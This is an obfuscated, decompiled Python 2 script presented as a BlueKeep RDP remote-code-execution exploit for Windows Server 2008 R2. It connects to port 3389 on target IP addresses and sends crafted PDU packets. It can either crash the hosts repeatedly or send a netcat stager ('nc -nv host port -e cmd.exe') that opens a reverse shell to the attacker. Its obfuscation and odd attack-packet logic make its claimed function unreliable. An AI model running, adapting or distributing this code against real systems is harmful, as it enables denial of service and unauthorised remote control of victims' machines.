# uncompyle6 version 3.3.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Aug 21 2015, 12:07:58) [MSC v.1500 64 bit (AMD64)]
# Embedded file name: bluekeep_rce_2008r2.py
# Compiled at: 2019-06-09 11:57:39
import sys, time, socket, struct, random, argparse, binascii
try:
    import requests
    from OpenSSL import SSL
    from impacket.impacket.structure import Structure
except:
    print '[!] install `impacket` and `requests`'
    exit(1)

class Parser(argparse.ArgumentParser):

    def __init__(O0OO0OO0O0O0OOO00):
        super(Parser, O0OO0OO0O0O0OOO00).__init__()

    @staticmethod
    def optparse():
        O0000O00000O00000 = argparse.ArgumentParser()
        O0000O00000O00000.add_argument('-i', '--ip', dest='ipToAttack', metavar='IP[,IP,IP,..]', default=None, help='Pass a list of IP addresses separated by a comma or a single IP address (*default=None)')
        O0000O00000O00000.add_argument('-a', '--arch', type=int, choices=(32, 64), dest='archSelected', metavar='OS-ARCHITECTURE', default=64, help='Pass the architecture of the target you are attacking (*default=64)')
        O0000O00000O00000.add_argument('-c', '--command', choices=('bluescreen', 'shell'), dest='executionCommand', metavar='ATTACK-TYPE', default='bluescreen', help='Choose your attack style (*default=bluescreen)')
        O0000O00000O00000.add_argument('-w', '--wait-time', type=int, dest='waitTime', default=70, metavar='SECONDS-TO-WAIT', help="Pass how long you want to wait in between DoS's (*default=70)")
        O0000O00000O00000.add_argument('-d', '--dos-times', type=int, dest='dosAmount', default=10, metavar='DOS-TIMES', help='Pass the amount of times to DoS the target (*default=10)')
        O0000O00000O00000.add_argument('-v', '--verbose', action='store_true', default=False, dest='runVerbose', help='Show the received packets (*default=False)')
        O0000O00000O00000.add_argument('-pL', '--packet-length', type=int, choices=range(4, 10, 2), dest='packetLength', metavar='PACKET-LENGTH', default=6, help='Choose the length of the packets sent during the attack (*default=6)')
        O0000O00000O00000.add_argument('-lH', '--listen-host', default=get_my_ip(), dest='listenHost', metavar='LISTEN-HOST', help=('Set your listener (*default={})').format(get_my_ip()))
        O0000O00000O00000.add_argument('-lP', '--listen-port', default=random.randint(10000, 20000), dest='listenPort', metavar='LISTEN-PORT', help='Set your listening port (*default=random 10000-20000)')
        return O0000O00000O00000.parse_args()


class TPKT(Structure):
    commonHdr = (
     ('Version', 'B=3'), ('Reserved', 'B=0'), ('Length', '>H=len(TPDU)+4'), ('_TPDU', '_-TPDU', 'self["Length"]-4'), ('TPDU', ':=""'))


class TPDU(Structure):
    commonHdr = (
     ('LengthIndicator', 'B=len(VariablePart)+1'), ('Code', 'B=0'), ('VariablePart', ':=""'))

    def __init__(O000OO00OOO0O00OO, data=None):
        Structure.__init__(O000OO00OOO0O00OO, data)
        O000OO00OOO0O00OO['VariablePart'] = ''


class CR_TPDU(Structure):
    commonHdr = (
     ('DST-REF', '<H=0'), ('SRC-REF', '<H=0'), ('CLASS-OPTION', 'B=0'), ('Type', 'B=0'), ('Flags', 'B=0'), ('Length', '<H=8'))


class DATA_TPDU(Structure):
    commonHdr = (
     ('EOT', 'B=0x80'), ('UserData', ':=""'))

    def __init__(O0000OO0O0O00OOOO, data=None):
        Structure.__init__(O0000OO0O0O00OOOO, data)
        O0000OO0O0O00OOOO['UserData'] = ''


class RDP_NEG_REQ(CR_TPDU):
    structure = (('requestedProtocols', '<L'), )

    def __init__(O0O0O0O0OO0000000, data=None):
        CR_TPDU.__init__(O0O0O0O0OO0000000, data)
        if data is None:
            O0O0O0O0OO0000000['Type'] = 1
        return


def get_my_ip():
    return requests.get('https://icanhazip.com').content.strip()


def unpack(O0OOO00O0O00OOO0O):
    return binascii.unhexlify(O0OOO00O0O00OOO0O)


def pack(OOOOO0000OOOO0OOO):
    return binascii.hexlify(OOOOO0000OOOO0OOO)


def structify(O0OOOO000O0O00OOO, OO0OO000OOO0OOO00, O0O00OOOOOO000O00):
    O000O000O000O0O00 = [
     struct.pack(OO0OO000OOO0OOO00, len(O0OOOO000O0O00OOO)), struct.pack(OO0OO000OOO0OOO00, len(O0OOOO000O0O00OOO) - O0O00OOOOOO000O00[0]), struct.pack(OO0OO000OOO0OOO00, len(O0OOOO000O0O00OOO) - O0O00OOOOOO000O00[1]), struct.pack(OO0OO000OOO0OOO00, len(O0OOOO000O0O00OOO) - O0O00OOOOOO000O00[2]), struct.pack(OO0OO000OOO0OOO00, len(O0OOOO000O0O00OOO) - O0O00OOOOOO000O00[3]), struct.pack(OO0OO000OOO0OOO00, len(O0OOOO000O0O00OOO) - O0O00OOOOOO000O00[4])]
    return O000O000O000O0O00


def send_initialization_pdu_packet(O000O000O000OO0OO, verbose=False):
    O00O0000O0OO0OOO0 = TPKT()
    OOO00OO0O0O0OOO00 = TPDU()
    OO00O0OOOO0OO00OO = RDP_NEG_REQ()
    OO00O0OOOO0OO00OO['Type'] = 1
    OO00O0OOOO0OO00OO['requestedProtocols'] = 1
    OOO00OO0O0O0OOO00['VariablePart'] = OO00O0OOOO0OO00OO.getData()
    OOO00OO0O0O0OOO00['Code'] = 224
    O00O0000O0OO0OOO0['TPDU'] = OOO00OO0O0O0OOO00.getData()
    O000OO00O0000O0O0 = socket.socket()
    O000OO00O0000O0O0.connect((O000O000O000OO0OO, 3389))
    O000OO00O0000O0O0.sendall(O00O0000O0OO0OOO0.getData())
    OOO0O0O000OO0000O = O000OO00O0000O0O0.recv(8192)
    if verbose:
        print ('[@] received: {}').format(repr(OOO0O0O000OO0000O))
    return O000OO00O0000O0O0


def create_tls(O0O0OO000000O000O):
    OO00OOO0O0000O00O = SSL.Context(SSL.TLSv1_METHOD)
    OOO00000000O0O0O0 = SSL.Connection(OO00OOO0O0000O00O, O0O0OO000000O000O)
    OOO00000000O0O0O0.set_connect_state()
    OOO00000000O0O0O0.do_handshake()
    return OOO00000000O0O0O0


def send_client_data_pdu_packet(OOO0OOOOOOOOOOOO0, deletion_structure=(12, 109, 118, 132, 390), verbose=False, differ_secondary=129):
    O0O00OO0O000000OO = unpack('030001ca02f0807f658207c20401010401010101ff30190201220201020201000201010201000201010202ffff020102301902010102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff02010204820161000500147c00018148000800100001c00044756361813401c0ea000a0008008007380401ca03aa09040000ee4200004400450053004b0054004f0050002d004600380034003000470049004b00000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca01000000000018000f00af07620063003700380065006600360033002d0039006400330033002d003400310039380038002d0039003200630066002d0000310062003200640061004242424207000100000056020000500100000000640000006400000004c00c00150000000000000002c00c001b0000000000000003c0380004000000726470736e6400000f0000c0636c6970726472000000a0c0647264796e766300000080c04d535f543132300000000000')
    OO0O00OOOOOOO000O, OO00O0OO0000O00OO, OO0O0OOO0O0OO0OOO, O0OOOOO000O0OOOO0, OOO00OO0O0OO0O00O, O00OOO0OOOO000O0O = structify(O0O00OO0O000000OO, '>h', deletion_structure)
    O00O0OO000OOOOOO0 = bytearray()
    O00O0OO000OOOOOO0.extend(map(ord, O0O00OO0O000000OO))
    O00O0OO000OOOOOO0[2] = OO0O00OOOOOOO000O[0]
    O00O0OO000OOOOOO0[3] = OO0O00OOOOOOO000O[1]
    O00O0OO000OOOOOO0[10] = OO00O0OO0000O00OO[0]
    O00O0OO000OOOOOO0[11] = OO00O0OO0000O00OO[1]
    O00O0OO000OOOOOO0[107] = OO0O0OOO0O0OO0OOO[0]
    O00O0OO000OOOOOO0[108] = OO0O0OOO0O0OO0OOO[1]
    O00O0OO000OOOOOO0[116] = differ_secondary
    O00O0OO000OOOOOO0[117] = O0OOOOO000O0OOOO0[1]
    O00O0OO000OOOOOO0[130] = differ_secondary
    O00O0OO000OOOOOO0[131] = OOO00OO0O0OO0O00O[1]
    O00O0OO000OOOOOO0[392] = O00OOO0OOOO000O0O[1]
    OOO0OOOOOOOOOOOO0.sendall(bytes(O00O0OO000OOOOOO0))
    OOOO0O0000O00OO0O = OOO0OOOOOOOOOOOO0.recv(8192)
    if verbose:
        print ('[@] received: {}').format(repr(OOOO0O0000O00OO0O))


def send_client_information_pdu_packet(O0OO0O0O00O000O00):
    O0O0OOOO00OO000OO = unpack('0300016102f08064000703eb7081524000a1a509040904bb47030000000e00080000000000000041004100410041004100410041000000740065007300740000000000000002001c003100390032002e004141410038002e003200330032002e0031000000400043003a005c00570049004e0041414100570053005c00730079007300740065006d00330032005c006d007300740073006300610078002e0064006c006c000000a40100004d006f0075006e007400610069006e0020005300740061006e0064006100720064002000540069006d006500000000000000000000000000000000000000000000000b00000001000200000000000000000000004d006f0075006e007400610069006e0020004400610079006c0069006700680074002000540069006d006500000000000000000000000000000000000000000000000300000002000200000000000000c4ffffff0100000006000000000064000000')
    O0OO0O0O00O000O00.sendall(bytes(O0O0OOOO00OO000OO))


def send_channel_pdu_packets(OOO0O0O00O0000OO0, retval_size=1024, verbose=False):
    O00000OO0OOO0O0OO = unpack('0300000c02f0800401000100')
    OOO0O0O00O0000OO0.sendall(bytes(O00000OO0OOO0O0OO))
    O00000OO0OOO0O0OO = unpack('0300000802f08028')
    OOO0O0O00O0000OO0.sendall(bytes(O00000OO0OOO0O0OO))
    O000O000OO0OOO0O0 = OOO0O0O00O0000OO0.recv(retval_size)
    if verbose:
        print ('[@] received: {}').format(repr(O000O000OO0OOO0O0))
    O00000OO0OOO0O0OO = unpack('0300000c02f08038000703eb')
    OOO0O0O00O0000OO0.sendall(bytes(O00000OO0OOO0O0OO))
    O000O000OO0OOO0O0 = OOO0O0O00O0000OO0.recv(retval_size)
    if verbose:
        print ('[@] received: {}').format(repr(O000O000OO0OOO0O0))
    O00000OO0OOO0O0OO = unpack('0300000c02f08038000703ec')
    OOO0O0O00O0000OO0.sendall(bytes(O00000OO0OOO0O0OO))
    O000O000OO0OOO0O0 = OOO0O0O00O0000OO0.recv(retval_size)
    if verbose:
        print ('[@] received: {}').format(repr(O000O000OO0OOO0O0))
    O00000OO0OOO0O0OO = unpack('0300000c02f08038000703ed')
    OOO0O0O00O0000OO0.sendall(bytes(O00000OO0OOO0O0OO))
    O000O000OO0OOO0O0 = OOO0O0O00O0000OO0.recv(retval_size)
    if verbose:
        print ('[@] received: {}').format(repr(O000O000OO0OOO0O0))
    O00000OO0OOO0O0OO = unpack('0300000c02f08038000703ee')
    OOO0O0O00O0000OO0.sendall(bytes(O00000OO0OOO0O0OO))
    O000O000OO0OOO0O0 = OOO0O0O00O0000OO0.recv(retval_size)
    if verbose:
        print ('[@] received: {}').format(repr(O000O000OO0OOO0O0))
    O00000OO0OOO0O0OO = unpack('0300000c02f08038000703ef')
    OOO0O0O00O0000OO0.sendall(bytes(O00000OO0OOO0O0OO))
    O000O000OO0OOO0O0 = OOO0O0O00O0000OO0.recv(retval_size)
    if verbose:
        print ('[@] received: {}').format(repr(O000O000OO0OOO0O0))


def send_confirm_active_pdu_packet(OO00OO0OO000O00O0):
    OO0OOO00OO0O0O0O0 = unpack('0300026302f08064000703eb70825454021300f003ea030100ea0306003e024d53545343001700000001001800010003000002000000001d04000000000000000002001c00200001000100010080073804000001000100001a0100000003005800000000000000000000000000000000000000000001001400000001000000aa000101010101000001010100010000000101010101010101000101010000000000a1060600000000000084030000000000e404000013002800030000037800000078000000fc09008000000000000000000000000000000000000000000a0008000600000007000c00000000000000000005000c00000000000200020008000a0001001400150009000800000000000d005800910020000904000004000000000000000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000800010000000e0008000100000010003400fe000400fe000400fe000800fe000800fe001000fe002000fe004000fe008000fe0000014000000800010001030000000f0008000100000011000c00010000000028640014000c00010000000000000015000c0002000000000a00011a000800af9400001c000c0012000000000000001b00060001001e0008000100000018000b0002000000030c001d005f0002b91b8dca0f004f15589fae2d1a87e2d6010300010103d4cc44278a9d744e803c0ecbeea19c54053100310000000100000025000000c0cb080000000100c1cb1d00000001c0cf0200080000014000020101010001400002010104')
    OO0O0O0O00OOO000O = bytearray()
    OO0O0O0O00OOO000O.extend(map(ord, OO0OOO00OO0O0O0O0))
    OO00OO0OO000O00O0.sendall(bytes(OO0O0O0O00OOO000O))


def send_establish_session_pdu_packet(OOO0OO00OOO0O000O):
    O00OO0000OOO00OO0 = unpack('0300002402f08064000703eb701616001700f003ea030100000108001f0000000100ea03')
    OOO0OO00OOO0O000O.sendall(bytes(O00OO0000OOO00OO0))
    O00OO0000OOO00OO0 = unpack('0300002802f08064000703eb701a1a001700f003ea03010000010c00140000000400000000000000')
    OOO0OO00OOO0O000O.sendall(bytes(O00OO0000OOO00OO0))
    O00OO0000OOO00OO0 = unpack('0300002802f08064000703eb701a1a001700f003ea03010000010c00140000000100000000000000')
    OOO0OO00OOO0O000O.sendall(bytes(O00OO0000OOO00OO0))
    O00OO0000OOO00OO0 = unpack('0300058102f08064000703eb70857272051700f003ea030100000100002b00000000000000a9000000000000000000a9000000000002000000a3ce2035db94a5e60da38cfb64b763cae79a84c10d67b791767121f96796c0a2775ad8b2744f30352be7b0d2fd81901a8fd55eee5a6dcbea2fa52b06e90b0ba6ad012f7a0b7cff89d3a3e1f80096a68d9a42fcab14058f16dec805baa0a8ed30d86782d79f84c33827da61e3a8c365e6ec0cf63624b20ba6171f463016c7736014b5f13a3c957d7d2f747e56ff9ce001329df2d9355e95782fd5156c18340f43d72b97a9b428f4736c16db43d7e5580c5a03e37358d7d976c2fe0bd7f412431b706d74c23df12660588031070e85a395f89376999feca0d4955b05fa4fdf778a7c299f0b4fa1cbfa9566ba47e3b044df83034424f41ef2e5cba95304c276cb4dc6c2d43fd38cb37cf3aaf393fe25bd327d486e939668e5182bea84256902a538656f0f9ff6a13a1d229d3f6de04cee8b24f0dcff7052a70df9528a1e331a301115d7f895a9bb74258ce3e9930743f55060f7962ed3ff63e0e324f1103d8e0f56bc2eb8900cfa4b9668fe596821d0ff52fe5c7d90d439be479d8e7aaf954f10ea7b7ad3ca07283e4e4b810ef15f1f8dbe0640272f4a03803267542f93fd255d6da0ad234572ffd1eb5b5175a761e03fe4eff496cda5138ae6527470bfc1f9fb689edd728fb4445f3acb752a20a669d276f957462b5bdaba0f9be060e18b9033410a2dc506fed0f0fcde35d41eaa760baef4d5bdfaf355f5c16765751c1d5ee83afe54502304ae2e71c27697e639c6b2258792635261d16c07c11c00300da72f55a34f23b239c7046c97157ad72433912806a6e7c3795cae7f5054c2381e90231dd0ff5a56d61291d296decc62c8ee9a4407c1ecf7b6d99cfe301cddb33b93653cb480fbe387f0ee42d8cf08984de76b990a43ed137290a967fd3c6336ec55faf61f35e728f387a6ce2e34aa0db2fe1718a20c4e5ff0d198624a2e0eb08db17f32528e87c9687c0cefee88ae742a33ff4b4dc5e5183874c72883f77287fc79fb3eced051132d7cb458a2e628674feca6816cf79a29a63bcaecb8a12750b7effc81bf5d862094c01a0c4150a95e104a82f1741f7821f5706124003d475ff325803c4beaa3f477eaa1421a170f6da8359e9126344304c6c65b217d8cc722917b2c2d2fd67ea552a80880eb60d144098e3ca1aa67600a26c6b5c679a64f8b8c255cf10b23f4d8a66df19178f9e52a502f5a4422d9195cafd6ac97a2f80d0ce3dd884898280b8bbd76dcdecae2c24a8750d48c775ad8b2744f3035bf28aed9a298a5bc60cab8904d2046d98a1a30018b38631a57095146959bd8800cb07724bf2bd35722d9195cafd6ac97a2f80d0ce3dd884898280b8bbd76dcdecae2c24a8750d48c569238ed6b9b5b1fba53a10ef7751053224c0a758854693f3bf318676b0f19d1002586cda8d9dd1d8d268754d979c0746590d73332afba9d5ad56c7ca147e1496e1cce9f62aa26163f3cec5b49e5c060d4bea788bca19f29718ceb69f873fbaf29aa401be592d277a72bfbb677b731fbdc1e63637df2fe3c6aba0b20cb9d64b83114e270072cdf9c6fb53ac4d5b5c93e9ad7d530dc0e1989c60888e1ca81a628dd9c740511e7e1ccbcc776dd55e2ccc2cbd3b64801ddffbaca31ab26441cdc0601dff29050b86b8fe829f0baecfb2dfd7afc7f57bdea90f7cf921ec420d0b69fd6dca182a96c5e3e83415773e9e75a3fda244f735ef4e09224bd0bd03c4996b5b50532cb581d6f9751ee0cdc0b2a60ef973e5a30811591cf1107252c41db7072e175f6a5ffe844e703e361aadbe0073d070be35c09a95e10fdcf749e23f1308616ef254efea493a5800a0139cc117a6e94225bd8c6c9a8df1396b391336e87bb94632d8864a75889dadc7f2ae3a166e5c87fc2dbc77d2fa946284569bcac9f859eb09f9a49b4b1cb')
    OOO0OO00OOO0O000O.sendall(bytes(O00OO0000OOO00OO0))
    O00OO0000OOO00OO0 = unpack('0300002802f08064000703eb701a1a001700f003ea03010000010000270000000000000003003200')
    OOO0OO00OOO0O000O.sendall(bytes(O00OO0000OOO00OO0))


def send_attack_packets(O00O0OOOO0OOOO000, OO000O00OO0000O00, packet_length=7, attack_type='bluescreen'):
    try:
        pass
    except:
        print '[!] packet length must be integer between 5-10'
        exit(1)

    if attack_type == 'bluescreen':
        O0O0OO00O00OOOO0O = '0300002e02f08064000703ef70140c0000000300000000000000020000000000000000000000'
        OO0OO0OO00OOO00O0 = '0300002e02f08064000703ef70140c000000030000000000000000000000020000000000000000000000000000000000000000000000'
    else:
        O0O0OO00O00OOOO0O = '0300002e02f08064000703ef70140c0000000300000000000000020000'
        OO0OO0OO00OOO00O0 = '0300002e02f08064000703ef70140c000000030000000000000000000000020000'
    OOOO00OOOOOO0OO00 = OO0OO0OO00OOO00O0 if OO000O00OO0000O00 == 64 else O0O0OO00O00OOOO0O
    if attack_type.lower() == 'bluescreen':
        OOO0OOO0OO0O0OO0O = [
         OOOO00OOOOOO0OO00]
    else:
        OOO0OOO0OO0O0OO0O = [ OOOO00OOOOOO0OO00[O0O0O0OO00O0O0O00:O0O0O0OO00O0O0O00 + packet_length] for O0O0O0OO00O0O0O00 in range(0, len(OOOO00OOOOOO0OO00), packet_length) ]
    for OO0OO0O0OO00O0O00 in OOO0OOO0OO0O0OO0O:
        print ('[+] sending packet: {}').format(OO0OO0O0OO00O0O00)
        O00O0OOOO0OOOO000.sendall(bytes(unpack(OO0OO0O0OO00O0O00)))


def send_stage(O00OOO0OOO0O0O000, OO00O00O00000000O, O00O00OOOO0O000O0):
    OO00O0O00O0000000 = ('nc -nv {} {} -e cmd.exe').format(OO00O00O00000000O, O00O00OOOO0O000O0)
    O0O000OOOOO00O0OO = '\\x' + ('\\x').join(('{0:x}').format(ord(O00OO0O000OOO0O00)) for O00OO0O000OOO0O00 in OO00O0O00O0000000)
    O00OOO0OOO0O0O000.sendall(bytes(O0O000OOOOO00O0OO))


def main():
    OO0O000O000OOO00O = Parser().optparse()
    O0OO0O00O0OOOO0OO = []
    if OO0O000O000OOO00O.ipToAttack is not None:
        for O0O0OOO0O0OOO00O0 in OO0O000O000OOO00O.ipToAttack.split(','):
            O0OO0O00O0OOOO0OO.append(O0O0OOO0O0OOO00O0.strip())

    else:
        print 'usage (~ == default): bluekeep_rce_2008r2.py -i IP[IP,IP,...] [-a 32|~64] [-c ~bluescreen|shell] [-w TIME|~70] [-pL 5|6|~7|8|9|10] [-v]'
        exit(1)
    for O0OO0000OOOOO0OOO in O0OO0O00O0OOOO0OO:
        try:
            print '[+] establishing initialization'
            OO00000OOO0OO0OOO = send_initialization_pdu_packet(O0OO0000OOOOO0OOO, verbose=OO0O000O000OOO00O.runVerbose)
            O00O0OOOO0OO0O000 = create_tls(OO00000OOO0OO0OOO)
            print '[+] sending ClientData PDU packets'
            send_client_data_pdu_packet(O00O0OOOO0OO0O000, verbose=OO0O000O000OOO00O.runVerbose)
            print '[+] sending ChannelJoin ErectDomain and AttachUser PDU packets'
            send_channel_pdu_packets(O00O0OOOO0OO0O000, verbose=OO0O000O000OOO00O.runVerbose)
            print '[+] sending ClientInfo PDU packet'
            send_client_information_pdu_packet(O00O0OOOO0OO0O000)
            print '[+] receiving current'
            OO0O000OOO0000000 = O00O0OOOO0OO0O000.recv(8000)
            if OO0O000O000OOO00O.runVerbose:
                print ('[@] received: {}').format(repr(OO0O000OOO0000000))
            OO0O000OOO0000000 = O00O0OOOO0OO0O000.recv(8000)
            if OO0O000O000OOO00O.runVerbose:
                print ('[@] received: {}').format(repr(OO0O000OOO0000000))
            print '[+] confirming user is active'
            send_confirm_active_pdu_packet(O00O0OOOO0OO0O000)
            print '[+] establishing the connection'
            send_establish_session_pdu_packet(O00O0OOOO0OO0O000)
            print '[+] sending attack packets'
            OOOOO0OOOOOOOOO00 = 1 if OO0O000O000OOO00O.executionCommand != 'bluescreen' else OO0O000O000OOO00O.dosAmount
            for OO0OO0O000O0O0O00 in range(OOOOO0OOOOOOOOO00):
                if OO0O000O000OOO00O.executionCommand == 'bluescreen':
                    print ('[+] starting DoS attempt #{}').format(OO0OO0O000O0O0O00 + 1)
                send_attack_packets(O00O0OOOO0OO0O000, OO0O000O000OOO00O.archSelected, attack_type=OO0O000O000OOO00O.executionCommand, packet_length=OO0O000O000OOO00O.packetLength)
                if OO0O000O000OOO00O.executionCommand == 'bluescreen':
                    print ('[+] target should be dead now, waiting {}s before starting again').format(OO0O000O000OOO00O.waitTime)
                    time.sleep(OO0O000O000OOO00O.waitTime)
                    print '\n[+] starting again\n'
                else:
                    print ('[+] sending stager using host: {} and port: {}').format(OO0O000O000OOO00O.listenHost, OO0O000O000OOO00O.listenPort)
                    raw_input('[?] press enter when listener is ready..')
                    send_stage(O00O0OOOO0OO0O000, OO0O000O000OOO00O.listenHost, OO0O000O000OOO00O.listenPort)
                    O000OOOO0O00OOO0O = 30
                    print '[+] sleeping to give time for execution\n'
                    for _OO00O000OO00O0O0O in range(O000OOOO0O00OOO0O):
                        sys.stdout.write('.')
                        sys.stdout.flush()
                        time.sleep(1)

                    print '\n\n[+] stager should be set enjoy your shell!'

        except Exception as OO0OO000O00O00000:
            print ('[!] error on target: {} ({}), if this happened after a successful attack, change the wait time `-w` or the packet length `-pL`').format(O0OO0000OOOOO0OOO, OO0OO000O00O00000)

    return


if __name__ == '__main__':
    main()
# okay decompiling 1.pyc
